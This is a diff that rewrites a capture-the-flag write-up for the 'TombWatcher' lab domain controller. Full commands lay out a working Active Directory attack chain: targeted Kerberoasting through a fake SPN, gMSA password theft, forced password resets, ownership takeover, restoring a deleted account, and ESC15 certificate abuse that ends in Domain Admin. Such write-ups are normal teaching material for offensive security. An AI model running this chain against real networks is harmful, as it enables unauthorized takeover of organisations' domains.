@@ -14,9 +14,9 @@
 
 
 ---
-## Enumeration
+## Recon
 
-Let's kick things off with an Nmap scan using the `-sV` and `-sC` flags to identify open ports and running services:
+I'll start with an nmap scan to identify open ports and services:
 
 ```
 $ nmap -sC -sV -v -oA TombWatcher 10.129.232.167
@@ -60,18 +60,16 @@ PORT     STATE SERVICE       VERSION                                            
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows 
 ```
 
-Looking at the output, we can see a large number of open ports `53, 88, 135, 139, 389, 445, 464, 593, 636, 5985` which, combined with the LDAP service banner showing the domain `tombwatcher.htb` and hostname `DC01.tombwatcher.htb`, strongly suggests we're dealing with a **Domain Controller**. 
-
-Let's add the domain name and DC hostname to our `/etc/hosts` file before moving on.
+Kerberos, LDAP, and SMB together confirm this is a domain controller. The domain is `tombwatcher.htb`, hostname `DC01`. I'll add both to `/etc/hosts`.
 
 ![](Assets/2026-08-08_18-14.png)
 
 
-Visiting port 80 gives us a default IIS web page - nothing useful.
+Port 80 just serves a default IIS page.
 
 ![](Assets/2026-08-08_18-15.png)
 
-I decided to run directory brute-forcing against it just to be thorough. Unfortunately, this didn't turn up anything interesting.
+I run a directory brute force against it anyway, just to be thorough:
 
 ```
 ffuf -u http://10.129.232.167/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
@@ -79,54 +77,53 @@ ffuf -u http://10.129.232.167/FUZZ -w /usr/share/wordlists/seclists/Discovery/We
 
 ![](Assets/2026-08-08_18-36.png)
 
-I shifted my focus toward the AD-specific services instead - since we already had a set of credentials (`henry:H3nry_987TGV!`) to work with.
+Nothing interesting turns up.
 
-With valid credentials in hand, I checked for any accessible SMB shares that might have read or write permissions:
+## Enumeration
+
+Since the web side is a dead end, I'll shift to the AD services. We're given a starting credential, `henry:H3nry_987TGV!`, so I'll check for accessible SMB shares first:
 
 ```
 netexec smb 10.129.262.167 -u henry -p 'H3nry_987TGV!' --shares
 ```
 
-Again, no luck here - nothing worth digging into.
-
 ![](Assets/2026-08-08_18-19.png)
 
-Next, let's enumerate the domain's user accounts with NetExec:
+Nothing worth digging into here either. Next, I'll enumerate domain users:
 
 ```
 netexec smb 10.129.232.167 -u henry -p H3nry_987TGV! --users | tee users.txt
 ```
 
-This gave us four non-default usernames that could be worth investigating later. 
-
 ![](Assets/2026-08-08_18-22.png)
 
+This gives four non-default usernames worth following up on.
 ## Foothold
 
-With a decent picture of the domain's users forming, it's time to bring in **BloodHound** to map out the AD attack surface:
+With a set of users in hand, I'll pull data for `BloodHound` to map out the domain:
 
 ```
 sudo bloodhound-python -u henry -p 'H3nry_987TGV!' -ns 10.129.232.167 -d tombwatcher.htb -c all
 zip -r tombwatcher.zip *.json
 ```
 
-We can now start BloodHound and import this zip file into it.
+I import the zip into BloodHound.
 
 ![](Assets/2026-08-08_18-35.png)
 
-After importing the collected data, I marked `henry` as owned and checked his **Outbound Object Control** rights. This revealed that henry holds **WriteSPN** rights over the user `alfred`.
+Marking `henry` as owned and checking his outbound object control, he holds `WriteSPN` over the user `alfred`.
 
 ![](Assets/2026-08-08_18-44.png)
 
-This means we can register a custom SPN under alfred's account and perform a **Kerberoasting** attack to extract a Ticket Granting Service (TGS) ticket, which can then be cracked offline to recover alfred's password.
+`WriteSPN` lets me register a custom SPN on `alfred`'s account, which makes him kerberoastable even though he wasn't originally, the resulting TGS ticket can then be cracked offline to recover his password.
 
-Let's set a fake SPN on alfred using henry's credentials:
+I'll set a fake SPN on `alfred` using `henry`'s credentials:
 
 ```
 bloodyad --host tombwatcher.htb -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'fake/kerberoast'
 ```
 
-Now that alfred has an SPN, we can request the TGS ticket:
+Now that `alfred` has an SPN, I'll request his TGS ticket:
 
 ```
 impacket-GetUserSPNs -dc-ip 10.129.232.167 tombwatcher.htb/henry -request-user alfred -outputfile alfred_tgs
@@ -134,7 +131,7 @@ impacket-GetUserSPNs -dc-ip 10.129.232.167 tombwatcher.htb/henry -request-user a
 
 ![](Assets/2026-08-08_19-11.png)
 
-Our SPN attack worked (we can see fake/kerberoast listed for Alfred), but the actual TGS request failed due to clock skew between our machine and the DC. We can fix this and re-run the command like this:
+The SPN itself gets set correctly, but the TGS request fails due to clock skew between my machine and the DC. I'll fix that with `faketime` and re-run it:
 
 ```
 sudo apt install faketime -y
@@ -143,7 +140,7 @@ faketime "$(ntpdate -q 10.129.232.167 | cut -d' ' -f1,2)" impacket-GetUserSPNs -
 
 ![](Assets/2026-08-08_19-21.png)
 
-With the hash captured, we can move to cracking it. 
+With the hash captured, I crack it:
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt alfred_tgs
@@ -151,21 +148,21 @@ john --wordlist=/usr/share/wordlists/rockyou.txt alfred_tgs
 
 ![](Assets/2026-08-09_20-15.png)
 
-Once cracked, I tested the recovered password against SMB and WinRM to check its validity. As we can see, these credentials work for SMB but not for WinRM.
+I test the recovered password against SMB and WinRM. It works for SMB, but not for WinRM.
 
 ![](Assets/2026-08-08_19-34.png)
 
-Digging further in BloodHound, we found that alfred has the ability to add himself to the `Infrastructure` group. Members of this group have read access to the Group Managed Service Account (GMSA) password for the service account `ansible_dev$`.
+Digging further in BloodHound, `alfred` can add himself to the `Infrastructure` group. Members of that group have read access to the GMSA password for the service account `ansible_dev$`.
 
 ![](Assets/2026-08-08_19-40.png)
 
-Let's add alfred to the `Infrastructure` group using BloodyAD:
+I'll add `alfred` to `Infrastructure` group:
 
 ```
 bloodyad --host tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball add groupMember "infrastructure" "alfred"
 ```
 
-Now we can read the GMSA password for the `ansible_dev$` account:
+Then read the GMSA password for `ansible_dev$`:
 
 ```
 bloodyad --host tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball -s get object 'ansible_dev$' --attr msDS-ManagedPassword
@@ -173,31 +170,29 @@ bloodyad --host tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball -s ge
 
 ![](Assets/2026-08-08_20-08.png)
 
-With the GMSA password recovered, our next check in BloodHound showed that the `ansible_dev$` account holds **ForceChangePassword** rights over the user `sam`.
+With that password recovered, BloodHound shows `ansible_dev$` holds `ForceChangePassword` over the user `sam`.
 
 ![](Assets/2026-08-08_20-10.png)
 
-With this rights, we can change the password for the sam user and authenticate as him with the new password:
+I'll use that to reset `sam`'s password and authenticate as him:
 
 ```
 bloodyad --host tombwatcher.htb -d tombwatcher.htb -u 'ansible_dev$' -p ':cb3161cb2c9d84b58ba3014f55040d75' set password sam 'pass123'
 ```
 
-We successfully authenticate as sam with the new password!
-
 ![](Assets/2026-08-08_20-24.png)
 
-Continuing our enumeration as sam, we found that he holds **WriteOwner** rights over the user `john`, who is a member of the **Remote Management Users** group - making him a high-value target for us.
+Continuing enumeration as `sam`, he holds `WriteOwner` over the user `john`, who's a member of `Remote Management Users` - a high-value target since that means WinRM access.
 
 ![](Assets/2026-08-08_20-27.png)
 
-WriteOwner gives us the ability to take ownership of john's object, which then lets us grant ourselves further rights (typically GenericAll) to fully take over the account. Let's chain this attack together step by step:
+`WriteOwner` lets me take ownership of `john`'s object, then grant myself further rights to fully take it over. I'll chain this together:
 
 ```
 # Take ownership of john's object
 bloodyad --host tombwatcher.htb -d tombwatcher.htb -u sam -p 'pass123' set owner john sam
 
-# Grant ourself GenericAll on john
+# Grant myself GenericAll on john
 bloodyad --host tombwatcher.htb -d tombwatcher.htb -u sam -p 'pass123' add genericAll john sam
 
 # Reset john's password
@@ -206,11 +201,11 @@ bloodyad --host tombwatcher.htb -d tombwatcher.htb -u sam -p 'pass123' set passw
 
 ![](Assets/2026-08-08_20-41.png)
 
-We can now authenticate to WinRM successfully!
+I can now authenticate as john successfully!
 
 ![](Assets/2026-08-08_20-42.png)
 
-Log-in with john's credentials.
+I log in with `john`'s credentials:
 
 ```
 evil-winrm -i 10.129.232.167 -u john -p password123
@@ -226,33 +221,33 @@ netexec winrm 10.129.232.167 -u john -p password123 -x "type C:\Users\john\Deskt
 
 ## Privilege Escalation
 
-While exploring BloodHound as john, we discovered that he holds **GenericAll** permissions on the OU `ADCS@TOMBWATCHER.HTB`.
+While exploring BloodHound as john, he holds `GenericAll` over the OU `ADCS@TOMBWATCHER.HTB`.
 
 ![](Assets/2026-08-08_20-55.png)
 
-This OU had no visible objects in it, which looks suspicious. So I decided to check for deleted AD objects and accounts within this OU:
+This OU had no visible objects in it, which looks suspicious. I'll check for deleted AD objects inside it:
 
 ```
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
 ```
 
-This turned up several deleted instances - including a user account, `cert_admin`.
+This turns up several deleted items, including a user account, `cert_admin`.
 
 ![](Assets/2026-08-08_22-44.png)
 
-Let's restore this account:
+I'll restore this account:
 
 ```
 Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf 
 ```
 
-With our permissions on the OU, we can enable the account and reset its password:
+With `GenericAll` on the OU covering this restored account, I can reset its password directly:
 
 ```
 Set-ADAccountPassword -Identity 'cert_admin' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
 ```
 
-Now that we have full control over `cert_admin`, let's enumerate the certificate templates for any vulnerabilities:
+Now that I have full control over `cert_admin`, I'll check certificate templates for anything vulnerable:
 
 ```
 certipy-ad find -u cert_admin@tombwatcher.htb -p Password123! -dc-ip 10.129.232.167 -vulnerable
@@ -260,11 +255,13 @@ certipy-ad find -u cert_admin@tombwatcher.htb -p Password123! -dc-ip 10.129.232.
 
 ![](Assets/2026-08-08_22-53.png)
 
-Checking the generated report, `20260808225118_Certipy.txt`, confirmed an **ESC15** vulnerability on one of the templates.
+Checking the generated report, `20260808225118_Certipy.txt`, confirms an `ESC15` vulnerability on one of the templates
 
 ![](Assets/2026-08-08_22-52.png)
 
-Let's request a certificate for the administrator account, abusing the ESC15 misconfiguration:
+`ESC15` lets a low-privileged enrollee supply their own application policy and Subject Alternative Name in the certificate request - meaning I can request a client-auth certificate for any user, including `administrator`, without needing that account's own permissions.
+
+I'll request a certificate for `administrator`, abusing this misconfiguration:
 
 ```
 certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.232.167 -target DC01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
@@ -272,21 +269,21 @@ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.232.167 -target DC0
 
 ![](Assets/2026-08-08_23-11.png)
 
-With the `administrator.pfx` certificate now in hand, we can use it to obtain an LDAP shell as `administrator@tombwatcher.htb`:
+With the `administrator.pfx` certificate now in hand, I use it to obtain an LDAP shell as `administrator@tombwatcher.htb`:
 
 ```
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.167 -ldap-shell
 ```
 
-From here, we can either create a new account or use an existing one (we went with john) and add it to the **Domain Admins** group.
+From here, I add `john` directly to `Domain Admins`.
 
 ![](Assets/2026-08-08_23-16.png)
 
-Back in our evil-winrm session, we confirm that john is now a member of Domain Admins.
+Back in the `evil-winrm` session, `john` is confirmed as a member of `Domain Admins`.
 
 ![](Assets/2026-08-08_23-18.png)
 
-With that confirmed, we can now read our root flag!
+With that, I can read the root flag.
 
 ![](Assets/2026-08-08_23-25.png)
 
